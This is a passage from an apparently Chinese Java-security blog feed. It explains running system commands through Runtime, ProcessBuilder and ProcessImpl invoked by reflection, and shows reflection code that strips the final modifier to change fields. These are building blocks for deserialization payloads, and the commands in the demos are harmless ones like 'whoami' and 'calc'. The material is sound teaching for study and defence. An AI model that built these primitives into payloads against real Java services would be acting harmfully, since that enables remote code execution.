class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> ((readLen= inputStream.read(cache))!=-<span class="hljs-number">1</span>)<br>            byteArrayOutputStream.write(cache, <span class="hljs-number">0</span>, readLen);<br>        System.out.println(byteArrayOutputStream);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>大致思路：</p><ol><li>先调用 getRuntime() 返回一个 Runtime 对象，然后调用 Runtime 对象的 exec 的方法。</li><li>调用 Runtime 对象的 exec 的方法会返回 Process 对象，调用 Process 对象的 getInputStream() 方法。</li><li>调用 Process 对象的 getInputStream() 方法，此时，子进程已经执行了 whoami 命令作为子进程的输出，将这一段输出作为输入流传入 inputStream</li></ol><ul><li>OK，我们的第一行就是用来执行命令的，但是我们执行命令需要得到命令的结果，所以需要将结果存储到字节数组当中</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<span class="hljs-comment">//存储每次读取输入流的长度</span><br><span class="hljs-keyword">while</span> ((readLen = inputStream.read(cache))!=-<span class="hljs-number">1</span>)<br>    byteArrayOutputStream.write(cache, <span class="hljs-number">0</span>, readLen);<br>System.out.println(byteArrayOutputStream);<br></code></pre></td></tr></table></figure><p>上述代码的作用是将命令执行的结果输出到标准输出中；</p><h2 id="2-2-调用-ProcessBuilder-类进行命令执行"><a href="#2-2-调用-ProcessBuilder-类进行命令执行" class="headerlink" title="2.2 调用 ProcessBuilder 类进行命令执行"></a>2.2 调用 ProcessBuilder 类进行命令执行</h2><p>通过另一种方式执行命令再通过相同的方式将命令输出内容输出到标准输出；</p><p><code>ProcessBuilder processBuilder = new ProcessBuilder(&quot;命令&quot;, &quot;参数1&quot;, &quot;参数2&quot;);</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.mango.maliciousClass;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.maliciousClass.processBuilderCE.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/8/2 21:47</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">processBuilderCE</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;calc&quot;</span>).start().getInputStream();<br>        <span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-keyword">while</span>((readLen=inputStream.read(cache))!=-<span class="hljs-number">1</span>)<br>            byteArrayOutputStream.write(cache, <span class="hljs-number">0</span>, readLen);<br>        System.out.println(byteArrayOutputStream);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-3-利用反射调用-ProcessImpl-类进行命令执行"><a href="#2-3-利用反射调用-ProcessImpl-类进行命令执行" class="headerlink" title="2.3 利用反射调用 ProcessImpl 类进行命令执行"></a>2.3 利用反射调用 ProcessImpl 类进行命令执行</h2><p><code>ProcessImpl</code>类是更为底层的实现，<code>Runtime</code>和<code>ProcessBuilder</code>执行命令实际上也是调用<code>ProcessImpl</code>这个类来实现的。对于<code>ProcessImpl</code>类我们不能直接调用，但是可以通过反射来间接调用<code>ProcessImpl</code>来实现执行命令的目的。</p><ul><li>不能直接调用<code>ProcessImpl</code>是因为该类的构造方法是私有的，我们不能直接调用构造方法实例化对象，所以需要通过反射去进行命令执行</li></ul><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408022221568.png" alt="image-20240802222011848"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.mango.maliciousClass;<br><br><span class="hljs-keyword">import</span> javax.activation.MimetypesFileTypeMap;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.maliciousClass.processImplCE.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/8/2 22:16</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">processImplCE</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InvocationTargetException, IllegalAccessException, IOException, NoSuchMethodException &#123;<br>        Class&lt;?&gt; processImplClass = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);<br>        String[] cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;whoami&quot;</span>&#125;;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> processImplClass.getDeclaredMethod(<span class="hljs-string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="hljs-type">boolean</span>.class);<br>        method.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> (Process) method.invoke(<span class="hljs-literal">null</span>, cmds, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> e.getInputStream();<br>        <span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-keyword">while</span>((readLen=inputStream.read(cache))!=-<span class="hljs-number">1</span>)<br>            byteArrayOutputStream.write(cache, <span class="hljs-number">0</span>, readLen);<br>        System.out.println(byteArrayOutputStream);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="三、Java反射各种修饰符字段"><a href="#三、Java反射各种修饰符字段" class="headerlink" title="三、Java反射各种修饰符字段"></a>三、Java反射各种修饰符字段</h1><h2 id="3-1-private"><a href="#3-1-private" class="headerlink" title="3.1 private"></a>3.1 private</h2><p>这个修饰符就不必多说了，直接使用<code>getDeclaredField</code>获取相应变量，再通设置访问权限<code>setAccessible</code>去修改即可；</p><p>这里就不在做代码演示了，之前写过比较多类似的代码了。</p><h2 id="3-2-static"><a href="#3-2-static" class="headerlink" title="3.2 static"></a>3.2 static</h2><p>单单一个static修饰符静态变量，跟private是一致的。这里把<code>Drunkbaby</code>师傅的代码粘贴过来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticPerson</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printInfo</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(name);  <br>  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticReflect</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;src.ReflectDemo.ReflectFixFinal.pojo.StaticPerson&quot;</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.newInstance();  <br>        <span class="hljs-type">Method</span> <span class="hljs-variable">nameMethod</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;printInfo&quot;</span>);  <br>        nameMethod.invoke(m);  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);  <br>        nameField.setAccessible(<span class="hljs-literal">true</span>);  <br>        nameField.set(m,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;Drunkbaby static Silly&quot;</span>));  <br>        nameMethod.invoke(m);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-3-final"><a href="#3-3-final" class="headerlink" title="3.3 final"></a>3.3 final</h2><ol><li>final变量直接复制</li></ol><p>经过本人的一些尝试后发现确实无法修改及时绕过报错的问题，但是仍然无法做到对变量的修改；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.mango.entity;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.entity.Student.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/8/2 22:49</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;mango&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">gender</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;male&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">18</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Student&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, gender=&#x27;&quot;</span> + gender + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 创建 Student 类的对象</span><br>            <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;John&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;Before: &quot;</span> + student);<br><br>            <span class="hljs-comment">// 获取 Student 类的 Class 对象</span><br>            Class&lt;?&gt; clazz = Student.class;<br><br>            <span class="hljs-comment">// 获取 Student 类中的 final 变量 age</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">ageField</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br><br>            <span class="hljs-comment">// 将 ageField 设置为可访问</span><br>            ageField.setAccessible(<span class="hljs-literal">true</span>);<br><br>            <span class="hljs-comment">// 获取 Field 的 modifiers 属性的 Field 对象</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">modifiersField</span> <span class="hljs-operator">=</span> Field.class.getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);<br>            modifiersField.setAccessible(<span class="hljs-literal">true</span>);<br><br>            <span class="hljs-comment">// 修改 modifiers 属性，取消 final 修饰符</span><br>            modifiersField.setInt(ageField, ageField.getModifiers() &amp; ~Modifier.FINAL);<br><br>            <span class="hljs-comment">// 修改 final 变量的值</span><br>            ageField.setInt(student, <span class="hljs-number">20</span>);<br><br>            System.out.println(<span class="hljs-string">&quot;After: &quot;</span> + student);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>final变量间接赋值</li></ol><p>若是final变量通过简介赋值，则只需要通过与<code>private</code>修饰符修饰的变量一样的方法即可修改变量的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.mango.entity;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.entity.Student.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/8/2 22:49</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;mango&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">gender</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;male&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = <span class="hljs-number">18</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Student&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, gender=&#x27;&quot;</span> + gender + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 创建 Student 类的对象</span><br>            <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-number">18</span>);<br>            System.out.println(<span class="hljs-string">&quot;Before: &quot;</span> + student);<br><br>            <span class="hljs-comment">// 获取 Student 类的 Class 对象</span><br>            Class&lt;?&gt; clazz = Student.class;<br><br>            <span class="hljs-comment">// 获取 Student 类中的 final 变量 age</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">ageField</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br><br>            <span class="hljs-comment">// 将 ageField 设置为可访问</span><br>            ageField.setAccessible(<span class="hljs-literal">true</span>);<br><br><br>            <span class="hljs-comment">// 修改 final 变量的值</span><br>            ageField.setInt(student, <span class="hljs-number">20</span>);<br><br>            System.out.println(<span class="hljs-string">&quot;After: &quot;</span> + student);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="3-4-static-final"><a href="#3-4-static-final" class="headerlink" title="3.4 static + final"></a>3.4 static + final</h2><p>static + final终究也还是个final，若是该变量经过直接赋值的方式，那么变量的值便无法修改啦，通过反射机制也无法修改。</p><p>若是简介赋值则可以通过反射机制取消掉final修饰符再修改赋值即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticFinalPerson</span> &#123;  <br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printInfo</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(name);  <br>  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticFinalReflect</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;src.ReflectDemo.ReflectFixFinal.pojo.StaticFinalPerson&quot;</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.newInstance();  <br>        <span class="hljs-type">Method</span> <span class="hljs-variable">printMethod</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;printInfo&quot;</span>);  <br>        printMethod.invoke(m);  <br>  <br>        <span class="hljs-comment">// 获取StaticFinalPerson类中的 static final 变量 name</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);  <br>        <span class="hljs-comment">// 设置 nameField 可访问</span><br>        nameField.setAccessible(<span class="hljs-literal">true</span>);  <br>        <span class="hljs-comment">// 获取 nameField 的 modifiers 属性的 Field 对象</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameModifyField</span> <span class="hljs-operator">=</span> nameField.getClass().getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);  <br>        <span class="hljs-comment">// 将 nameModifyField 设置可访问</span><br>        nameModifyField.setAccessible(<span class="hljs-literal">true</span>);  <br>        <span class="hljs-comment">// 修改 modifiers 属性，取消 final 修饰符</span><br>        nameModifyField.setInt(nameField, nameField.getModifiers() &amp; ~Modifier.FINAL);  <br>        nameField.set(m,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;Drunkbaby Too Silly&quot;</span>));  <br>        <span class="hljs-comment">// 修改 modifiers 属性，取消 final 修饰符</span><br>        nameModifyField.setInt(nameField, nameField.getModifiers() &amp; ~Modifier.FINAL);  <br>        printMethod.invoke(m);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
      <tag>反序列化</tag>
      
      <tag>Java反射</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化之Java反射与URLDNS链分析</title>
    <link href="/2024/07/30/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJava%E5%8F%8D%E5%B0%84/"/>
    <url>/2024/07/30/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJava%E5%8F%8D%E5%B0%84/</url>
    
